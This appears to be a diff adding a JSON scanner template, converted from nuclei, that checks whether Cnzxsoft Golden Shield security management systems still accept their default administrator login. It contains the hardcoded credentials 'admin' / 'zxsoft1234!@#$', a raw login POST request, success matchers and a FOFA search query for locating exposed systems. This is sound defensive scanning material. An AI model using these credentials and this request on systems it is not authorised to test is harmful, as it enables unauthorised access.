@@ -1,0 +1,127 @@
+{
+  "id": "cnzxsoft-default-login",
+  "name": "Cnzxsoft System - Default Login",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "Cnzxsoft Golden Shield Information Security Management System has a default weak password.\n",
+  "tags": [
+    "default-login",
+    "cnzxsoft"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\u003d\"中新金盾信息安全管理系统\""
+  },
+  "variables": {
+    "password": [
+      "zxsoft1234!@#$"
+    ],
+    "username": [
+      "admin"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /?q\u003dcommon/login  HTTP/1.1\nHost: {{Hostname}}\nCookie: check_code\u003dptbh\nContent-Type: application/x-www-form-urlencoded\n\nname\u003d{{username}}\u0026password\u003d{{password}}\u0026checkcode\u003dptbh\u0026doLoginSubmit\u003d1\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(body,\"1\") \u0026\u0026 contains(header,\"ZXSOFT_JDIS_USR_NAME\u003ddeleted\") \u0026\u0026 !contains(body_1,\"userpwd_error\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "cnzxsoft-default-login",
+    "info": {
+      "name": "Cnzxsoft System - Default Login",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "Cnzxsoft Golden Shield Information Security Management System has a default weak password.\n",
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "title\u003d\u003d\"中新金盾信息安全管理系统\""
+      },
+      "tags": "default-login,cnzxsoft"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "username": [
+            "admin"
+          ],
+          "password": [
+            "zxsoft1234!@#$"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /?q\u003dcommon/login  HTTP/1.1\nHost: {{Hostname}}\nCookie: check_code\u003dptbh\nContent-Type: application/x-www-form-urlencoded\n\nname\u003d{{username}}\u0026password\u003d{{password}}\u0026checkcode\u003dptbh\u0026doLoginSubmit\u003d1\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(body,\"1\") \u0026\u0026 contains(header,\"ZXSOFT_JDIS_USR_NAME\u003ddeleted\") \u0026\u0026 !contains(body_1,\"userpwd_error\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
